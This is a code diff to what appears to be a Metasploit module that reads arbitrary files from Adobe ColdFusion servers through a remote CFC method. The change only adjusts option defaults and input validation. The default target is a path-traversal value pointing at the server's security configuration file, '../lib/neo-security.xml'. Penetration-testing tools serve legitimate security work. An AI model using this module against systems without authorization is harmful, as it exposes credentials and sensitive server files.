@@ -42,20 +42,16 @@ class MetasploitModule < Msf::Auxiliary
         Opt::RHOST('0.0.0.0'),
         OptBool.new('STORE_LOOT', [false, 'Store the target file as loot', true]),
         OptString.new('TARGETFILE', [true, 'The target file to read, relative to the wwwroot folder.', '../lib/neo-security.xml']),
-        OptString.new('CFC_ENDPOINT', [true, 'The target ColdFusion Component (CFC) endpoint', '']),
-        OptString.new('CFC_METHOD', [true, 'The target ColdFusion Component (CFC) remote method name', '']),
+        OptString.new('CFC_ENDPOINT', [true, 'The target ColdFusion Component (CFC) endpoint', nil]),
+        OptString.new('CFC_METHOD', [true, 'The target ColdFusion Component (CFC) remote method name', nil]),
         OptString.new('CFC_METHOD_PARAMETERS', [false, 'The target ColdFusion Component (CFC) remote method parameters (e.g. "param1=foo&param2=bar")', ''])
       ]
     )
   end
 
   def run
-    if datastore['CFC_ENDPOINT'].empty? || !datastore['CFC_ENDPOINT'].end_with?('.cfc')
+    unless datastore['CFC_ENDPOINT'].end_with? '.cfc'
       fail_with(Failure::BadConfig, 'The CFC_ENDPOINT must point to a .cfc file')
-    end
-
-    if datastore['CFC_METHOD'].empty?
-      fail_with(Failure::BadConfig, 'The CFC_METHOD must be set')
     end
 
     if datastore['TARGETFILE'].empty? || datastore['TARGETFILE'].end_with?('.cfc') || datastore['TARGETFILE'].end_with?('.cfm')
